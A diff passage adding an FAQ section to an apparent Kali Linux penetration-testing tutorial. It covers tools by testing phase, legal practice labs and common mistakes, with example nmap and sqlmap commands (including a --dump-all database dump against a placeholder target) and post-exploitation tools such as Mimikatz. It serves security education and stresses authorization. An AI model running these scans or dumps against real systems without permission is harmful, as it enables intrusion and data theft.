+            <p class="text-block">○ Nmap: Master basic port scanning before advanced features<br>○ Wireshark: Understand network protocols through packet analysis<br>○ Netcat: Learn networking fundamentals through this versatile tool</p>
+            <p class="text-block">2. Web Application Testing:<br>○ Burp Suite Community: Essential for understanding web security<br>○ OWASP ZAP: Free alternative with good learning resources<br>○ Nikto: Simple yet effective for basic web scanning</p>
+            <p class="text-block">3. Information Gathering:<br>○ theHarvester: Easy to use for OSINT collection<br>○ Whois/DNS tools: Understand information disclosure<br>○ Google Dorking: Master advanced search techniques</p>
+            <p class="text-block">4. Vulnerability Analysis:<br>○ Searchsploit: Learn about existing vulnerabilities<br>○ Nmap scripts: Use NSE for vulnerability detection<br>○ OpenVAS: Understand vulnerability scanning concepts</p>
+            <p class="text-block">5. Basic Exploitation:<br>○ Metasploit: Start with auxiliary modules before exploits<br>○ Hydra: Understand password attacks safely<br>○ John the Ripper: Learn password cracking basics</p>
+            <p class="text-block">Focus on understanding how each tool works rather than memorizing commands. Practice in legal lab environments and gradually expand your toolkit.</p>
+
+            <div class="tool-title">How can I practice using Kali Linux tools legally and safely?</div>
+            <p class="text-block">Creating a safe, legal practice environment is essential for developing skills:</p>
+            <p class="text-block">Virtual Lab Environments:</p>
+            <pre><code># VirtualBox/VMware setup
+- Install Kali Linux as VM
+- Create vulnerable target VMs:
+- Metasploitable 2/3
+- DVWA (Damn Vulnerable Web Application)
+- VulnHub machines
+- HackTheBox (with subscription)</code></pre>
+            <p class="text-block">2. Online Platforms:<br>○ TryHackMe: Guided learning paths with legal targets<br>○ HackTheBox: Realistic environments for practice<br>○ PentesterLab: Web application security focus<br>○ OverTheWire: Wargames and challenges<br>○ VulnHub: Downloadable vulnerable VMs</p>
+            <p class="text-block">Home Lab Setup:</p>
+            <pre><code># Basic home lab network
+- Isolated network segment
+- Multiple VMs for different scenarios
+- No connection to production networks
+- Regular snapshots for reset</code></pre>
+            <p class="text-block">4. Cloud-Based Labs:<br>○ AWS/Azure free tiers for cloud security testing<br>○ Docker containers for quick deployments<br>○ Kubernetes clusters for container security</p>
+            <p class="text-block">5. Legal Considerations:<br>○ Never test systems you don't own<br>○ Obtain written permission for any external testing<br>○ Use VPN for platform-provided labs only<br>○ Keep detailed logs of all practice activities</p>
+
+            <div class="tool-title">What are the essential differences between Kali Linux tools for different testing phases?</div>
+            <p class="text-block">Understanding tool categorization by testing phase improves assessment efficiency:</p>
+            <p class="text-block">1. Reconnaissance Tools:<br>○ Passive: No direct target interaction (theHarvester, Maltego, Shodan)<br>○ Active: Direct target probing (Nmap, Masscan, Fierce)<br>○ Purpose: Information gathering without alerting targets<br>○ Usage: Always start here to understand the target</p>
+            <p class="text-block">2. Scanning and Enumeration Tools:<br>○ Service identification: Version detection and banner grabbing<br>○ Vulnerability correlation: Matching services to known vulnerabilities<br>○ Purpose: Detailed technical information gathering<br>○ Key tools: Nmap, Enum4linux, SMBclient, SNMP-walk</p>
+            <p class="text-block">3. Vulnerability Assessment Tools:<br>○ Automated scanners: Broad vulnerability detection (OpenVAS, Nessus)<br>○ Specialized scanners: Focused on specific technologies (WPScan, SQLMap)<br>○ Purpose: Identify potential security weaknesses<br>○ Balance: Automated scanning with manual verification</p>
+            <p class="text-block">4. Exploitation Tools:<br>○ Frameworks: Comprehensive exploitation platforms (Metasploit, BeEF)<br>○ Standalone: Specific exploit tools (SQLMap, THC-Hydra)<br>○ Purpose: Verify vulnerabilities through controlled exploitation</p>
+            <p class="text-block">○ Caution: High impact, use only with explicit permission</p>
+            <p class="text-block">5. Post-Exploitation Tools:<br>○ Persistence: Maintaining access (Empire, Mimikatz)<br>○ Lateral movement: Expanding access (CrackMapExec, PSExec)<br>○ Purpose: Demonstrate impact and data access risks<br>○ Critical: Document everything, minimize system changes</p>
+
+            <div class="tool-title">How do I choose between similar tools in Kali Linux?</div>
+            <p class="text-block">Selecting between similar tools requires understanding their strengths and use cases:</p>
+            <p class="text-block">Web Scanners Comparison:</p>
+            <p class="text-block">Burp Suite vs OWASP ZAP:<br>- Burp: Better UI, extensive extensions, industry standard<br>- ZAP: Free, automated scanning, good API<br>Choose Burp for manual testing, ZAP for automation</p>
+            <p class="text-block">Nikto vs Dirb vs Gobuster:<br>- Nikto: Comprehensive web scanner<br>- Dirb: Classic directory brute-forcer<br>- Gobuster: Fast, modern alternative to Dirb<br>Use Nikto for general scanning, Gobuster for directories</p>
+            <p class="text-block">Password Crackers:</p>
+            <p class="text-block">John the Ripper vs Hashcat:<br>- John: CPU-based, better for quick cracks<br>- Hashcat: GPU-accelerated, faster for large operations<br>Choose based on hardware and hash complexity</p>
+            <p class="text-block">Hydra vs Medusa vs Ncrack:<br>- Hydra: Most protocols supported<br>- Medusa: Stable, modular design<br>- Ncrack: High-performance engine<br>Hydra for versatility, Ncrack for speed</p>
+            <p class="text-block">Network Scanners:</p>
+            <p class="text-block">Nmap vs Masscan vs Zmap:<br>- Nmap: Feature-rich, accurate<br>- Masscan: Internet-scale scanning<br>- Zmap: Specialized for research<br>Nmap for precision, Masscan for speed</p>
+            <p class="text-block">Exploitation Frameworks:</p>
+            <p class="text-block">Metasploit vs BeEF vs Empire:<br>- Metasploit: General exploitation<br>- BeEF: Browser-focused attacks<br>- Empire: Post-exploitation focus<br>Choose based on attack vector</p>
+
+            <div class="tool-title">What are the most common mistakes when using Kali Linux tools?</div>
+            <p class="text-block">Avoiding common pitfalls improves both effectiveness and professionalism:</p>
+            <p class="text-block">Scanning Without Permission:</p>
+            <pre><code># WRONG: Scanning random internet targets
+nmap -sV scanme.nmap.org # Even this requires consideration
+
+# RIGHT: Only scan authorized targets
+nmap -sV 192.168.1.100 # Your own lab network</code></pre>
+            <p class="text-block">Over-Aggressive Scanning:</p>
+            <pre><code># WRONG: May crash services
+nmap -T5 -A -sV -p- --script=vuln* target.com
+
+# RIGHT: Measured approach
+nmap -T3 -sV -p 80,443,22 target.com</code></pre>
+            <p class="text-block">Poor Documentation:</p>
+            <pre><code># WRONG: No logging or documentation
+sqlmap -u "http://target.com/page?id=1" --dump-all
+
+# RIGHT: Comprehensive logging
+sqlmap -u "http://target.com/page?id=1" --batch -v 3 --output-dir=./sqlmap_results/</code></pre>
+            <p class="text-block">Ignoring Scope:<br>○ Always verify IP ranges and domains<br>○ Check for cloud services that may be out of scope<br>○ Respect time windows for testing<br>○ Avoid testing production systems during business hours</p>
+            <p class="text-block">Inadequate Cleanup:</p>
+            <pre><code># Always remove:
+- Backdoors and shells
+- Created user accounts
+- Modified configurations
+- Test files and scripts
+- Log entries where authorized</code></pre>
+            <p class="text-block">Tool Dependency:<br>○ Don't rely solely on automated tools<br>○ Understand what tools are doing<br>○ Verify automated findings manually<br>○ Develop manual testing skills</p>
+            <p class="text-block">Legal and Ethical Violations:<br>○ Never exceed authorized scope<br>○ Don't share client data<br>○ Report findings appropriately<br>○ Maintain confidentiality</p>
+            <p class="text-block">Remember: Tools don't make the professional—knowledge, ethics, and methodology do.</p>
+        </section>
+
+        <!-- Related Articles -->
+        <section id="related-articles">
+            <h2 class="section-title">Related Articles and Resources</h2>
+            <ul>
+                <li>Kali Linux Official Documentation</li>
+                <li>Offensive Security Training</li>
+                <li>SANS Penetration Testing Resources</li>
+                <li>OWASP Testing Guide</li>
+                <li>Metasploit Unleashed</li>
+                <li>Burp Suite Documentation</li>
+                <li>Nmap Reference Guide</li>
+                <li>HackTricks - Pentesting Methodology</li>
+                <li>PayloadsAllTheThings</li>
+                <li>GTFOBins - Unix Binaries Exploitation</li>
+                <li>CyberChef - The Cyber Swiss Army Knife</li>
+                <li>ExploitDB - Exploit Database</li>
+                <li>CVE Details</li>
+                <li>MITRE ATT&CK Framework</li>
+                <li>VulnHub - Vulnerable VMs</li>
+                <li>TryHackMe - Cybersecurity Training</li>
+                <li>HackTheBox - Penetration Testing Labs</li>
+            </ul>
         </section>
 
         <!-- LESSON NAVIGATION BUTTONS -->
